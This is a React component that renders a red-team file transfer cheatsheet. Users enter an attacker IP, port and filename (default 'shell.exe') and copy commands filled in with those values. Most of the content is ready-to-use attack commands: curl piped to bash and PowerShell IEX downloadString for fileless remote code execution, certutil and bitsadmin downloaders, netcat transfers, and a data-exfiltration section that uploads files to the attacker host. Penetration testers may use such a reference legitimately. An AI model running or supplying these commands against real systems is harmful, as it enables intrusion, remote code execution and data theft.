import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Download, Upload, Copy, Check, Server, Terminal, Globe, Wifi, Shield, Database } from 'lucide-react';

const FileTransferHelper = () => {
    const [attackerIP, setAttackerIP] = useState('10.10.10.10');
    const [attackerPort, setAttackerPort] = useState('80');
    const [fileName, setFileName] = useState('shell.exe');
    const [copied, setCopied] = useState(null);

    const copyToClipboard = (text, key) => {
        const processed = text
            .replace(/\{\{IP\}\}/g, attackerIP)
            .replace(/\{\{PORT\}\}/g, attackerPort)
            .replace(/\{\{FILE\}\}/g, fileName);
        navigator.clipboard.writeText(processed);
        setCopied(key);
        setTimeout(() => setCopied(null), 2000);
    };

    const commands = {
        sender: [
            {
                name: 'Python HTTP Server',
                icon: '🐍',
                cmd: 'python3 -m http.server {{PORT}}',
                desc: 'Start a simple HTTP server in the current directory',
                os: 'Linux/Mac'
            },
            {
                name: 'Python HTTPS Server',
                icon: '🔐',
                cmd: 'python3 -c "import http.server, ssl; httpd = http.server.HTTPServer((\'0.0.0.0\', {{PORT}}), http.server.SimpleHTTPRequestHandler); httpd.socket = ssl.wrap_socket(httpd.socket, certfile=\'cert.pem\', server_side=True); httpd.serve_forever()"',
                desc: 'HTTPS server with SSL certificate',
                os: 'Linux/Mac'
            },
            {
                name: 'PHP Server',
                icon: '🐘',
                cmd: 'php -S 0.0.0.0:{{PORT}}',
                desc: 'PHP built-in development server',
                os: 'Any'
            },
            {
                name: 'Netcat Listener',
                icon: '🔌',
                cmd: 'nc -lvnp {{PORT}} < {{FILE}}',
                desc: 'Send file via netcat',
                os: 'Linux'
            },
            {
                name: 'Impacket SMB Server',
                icon: '📁',
                cmd: 'impacket-smbserver shareName $(pwd) -smb2support',
                desc: 'SMB share for Windows targets',
                os: 'Linux (Kali)'
            },
            {
                name: 'Impacket SMB + Auth',
                icon: '🔑',
                cmd: 'impacket-smbserver shareName $(pwd) -smb2support -username user -password pass',
                desc: 'SMB share with authentication',
                os: 'Linux (Kali)'
            },
        ],
        linux: [
            {
                name: 'wget',
                icon: '⬇️',
                cmd: 'wget http://{{IP}}:{{PORT}}/{{FILE}} -O /tmp/{{FILE}}',
                desc: 'Standard HTTP download'
            },
            {
                name: 'curl',
                icon: '🌐',
                cmd: 'curl http://{{IP}}:{{PORT}}/{{FILE}} -o /tmp/{{FILE}}',
                desc: 'cURL download to file'
            },
            {
                name: 'curl (Pipe to Bash)',
                icon: '⚡',
                cmd: 'curl http://{{IP}}:{{PORT}}/{{FILE}} | bash',
                desc: 'Execute script directly (dangerous!)'
            },
            {
                name: 'Netcat Receive',
                icon: '🔌',
                cmd: 'nc {{IP}} {{PORT}} > {{FILE}}',
                desc: 'Receive file via netcat'
            },
            {
                name: 'SCP',
                icon: '🔐',
                cmd: 'scp user@{{IP}}:/path/to/{{FILE}} /tmp/',
                desc: 'Secure copy over SSH'
            },
            {
                name: 'Base64 Decode',
                icon: '🔤',
                cmd: 'echo "BASE64_STRING" | base64 -d > {{FILE}}',
                desc: 'Decode base64 encoded file'
            },
        ],
        windows: [
            {
                name: 'PowerShell IWR',
                icon: '🪟',
                cmd: 'Invoke-WebRequest -Uri http://{{IP}}:{{PORT}}/{{FILE}} -OutFile C:\\Windows\\Temp\\{{FILE}}',
                desc: 'PowerShell web request download'
            },
            {
                name: 'PowerShell IWR (Short)',
                icon: '⚡',
                cmd: 'iwr http://{{IP}}:{{PORT}}/{{FILE}} -o {{FILE}}',
                desc: 'Short PowerShell alias'
            },
            {
                name: 'PowerShell IEX',
                icon: '💀',
                cmd: 'IEX(New-Object Net.WebClient).downloadString(\'http://{{IP}}:{{PORT}}/{{FILE}}\')',
                desc: 'Execute script in memory (fileless)'
            },
            {
                name: 'CertUtil',
                icon: '📜',
                cmd: 'certutil -urlcache -split -f "http://{{IP}}:{{PORT}}/{{FILE}}" C:\\Windows\\Temp\\{{FILE}}',
                desc: 'Certificate utility download (often allowed)'
            },
            {
                name: 'Bitsadmin',
                icon: '📦',
                cmd: 'bitsadmin /transfer job http://{{IP}}:{{PORT}}/{{FILE}} C:\\Windows\\Temp\\{{FILE}}',
                desc: 'Background transfer service'
            },
            {
                name: 'SMB Copy',
                icon: '📁',
                cmd: 'copy \\\\{{IP}}\\shareName\\{{FILE}} C:\\Windows\\Temp\\{{FILE}}',
                desc: 'Copy from SMB share'
            },
            {
                name: 'curl.exe',
                icon: '🌐',
                cmd: 'curl.exe http://{{IP}}:{{PORT}}/{{FILE}} -o C:\\Windows\\Temp\\{{FILE}}',
                desc: 'Windows curl (Win10+)'
            },
        ],
        upload: [
            {
                name: 'Python Upload Server',
                icon: '📤',
                cmd: 'python3 -c "import http.server, cgi; class Handler(http.server.CGIHTTPRequestHandler): cgi_directories = []; handler.do_POST = lambda self: self.send_response(200); http.server.HTTPServer((\'\', {{PORT}}), Handler).serve_forever()"',
                desc: 'Receive uploaded files'
            },
            {
                name: 'curl POST',
                icon: '⬆️',
                cmd: 'curl -X POST http://{{IP}}:{{PORT}}/upload -F "file=@{{FILE}}"',
                desc: 'Upload file via curl POST'
            },
            {
                name: 'PowerShell Upload',
                icon: '🪟',
                cmd: '(New-Object Net.WebClient).UploadFile("http://{{IP}}:{{PORT}}/upload", "C:\\path\\to\\{{FILE}}")',
                desc: 'PowerShell file upload'
            },
            {
                name: 'Base64 Encode + Transfer',
                icon: '🔤',
                cmd: '[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\\path\\to\\{{FILE}}")) | clip',
                desc: 'Encode file as base64'
            },
        ]
    };

    const CommandCard = ({ name, icon, cmd, desc, os }) => {
        const key = name + cmd;
        return (
            <div className="p-4 rounded-xl bg-white/5 border border-white/10 hover:border-cyan-500/30 transition-all group">
                <div className="flex items-center justify-between mb-3">
                    <div className="flex items-center gap-2">
                        <span className="text-xl">{icon}</span>
                        <span className="font-bold text-white">{name}</span>
                        {os && <span className="text-[10px] text-white/30 bg-white/5 px-2 py-0.5 rounded">{os}</span>}
                    </div>
                    <button
                        onClick={() => copyToClipboard(cmd, key)}
                        className={`p-2 rounded-lg transition-all ${copied === key ? 'bg-green-500 text-white' : 'bg-white/10 text-white/60 hover:bg-white/20'}`}
                    >
                        {copied === key ? <Check size={16} /> : <Copy size={16} />}
                    </button>
                </div>
                <div className="p-3 bg-black/40 rounded-lg font-mono text-xs text-cyan-300 overflow-x-auto">
                    {cmd.replace(/\{\{IP\}\}/g, attackerIP).replace(/\{\{PORT\}\}/g, attackerPort).replace(/\{\{FILE\}\}/g, fileName)}
                </div>
                <p className="mt-2 text-xs text-white/40">{desc}</p>
            </div>
        );
    };

    return (
        <div className="max-w-6xl mx-auto space-y-12 animate-fade-in">
            {/* Header */}
            <div className="text-center space-y-4">
                <h1 className="text-5xl font-black italic tracking-tighter flex items-center justify-center gap-4 underline decoration-cyan-500/50 underline-offset-8">
                    <Download size={48} className="text-cyan-500" />
                    FILE TRANSFER
                </h1>
                <p className="text-white/40 font-mono tracking-[0.3em] uppercase text-sm">Red team file transfer cheatsheet</p>
            </div>

            {/* Configuration */}
            <div className="p-6 rounded-2xl bg-white/5 border border-white/10">
                <div className="flex items-center gap-2 text-xs text-white/40 mb-4">
                    <Server size={14} /> CONFIGURATION
                </div>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div className="space-y-1">
                        <label className="text-xs text-white/40">Attacker IP</label>
                        <input
                            type="text"
                            value={attackerIP}
                            onChange={(e) => setAttackerIP(e.target.value)}
                            className="w-full p-3 bg-black/40 border border-white/10 rounded-xl font-mono text-cyan-400 focus:border-cyan-500/50 outline-none"
                        />
                    </div>
                    <div className="space-y-1">
                        <label className="text-xs text-white/40">Port</label>
                        <input
                            type="text"
                            value={attackerPort}
                            onChange={(e) => setAttackerPort(e.target.value)}
                            className="w-full p-3 bg-black/40 border border-white/10 rounded-xl font-mono text-cyan-400 focus:border-cyan-500/50 outline-none"
                        />
                    </div>
                    <div className="space-y-1">
                        <label className="text-xs text-white/40">Filename</label>
                        <input
                            type="text"
                            value={fileName}
                            onChange={(e) => setFileName(e.target.value)}
                            className="w-full p-3 bg-black/40 border border-white/10 rounded-xl font-mono text-cyan-400 focus:border-cyan-500/50 outline-none"
                        />
                    </div>
                </div>
            </div>

            {/* Sender Section */}
            <section className="space-y-4">
                <h2 className="text-xl font-black flex items-center gap-3 text-green-400">
                    <Upload size={24} /> SENDER (Attacker Machine)
                </h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {commands.sender.map((cmd, idx) => (
                        <CommandCard key={idx} {...cmd} />
                    ))}
                </div>
            </section>

            {/* Linux Receiver */}
            <section className="space-y-4">
                <h2 className="text-xl font-black flex items-center gap-3 text-blue-400">
                    <Terminal size={24} /> LINUX RECEIVER
                </h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {commands.linux.map((cmd, idx) => (
                        <CommandCard key={idx} {...cmd} />
                    ))}
                </div>
            </section>

            {/* Windows Receiver */}
            <section className="space-y-4">
                <h2 className="text-xl font-black flex items-center gap-3 text-purple-400">
                    <Database size={24} /> WINDOWS RECEIVER
                </h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {commands.windows.map((cmd, idx) => (
                        <CommandCard key={idx} {...cmd} />
                    ))}
                </div>
            </section>

            {/* Upload/Exfiltration */}
            <section className="space-y-4">
                <h2 className="text-xl font-black flex items-center gap-3 text-red-400">
                    <Shield size={24} /> DATA EXFILTRATION / UPLOAD
                </h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {commands.upload.map((cmd, idx) => (
                        <CommandCard key={idx} {...cmd} />
                    ))}
                </div>
            </section>
        </div>
    );
};

export default FileTransferHelper;
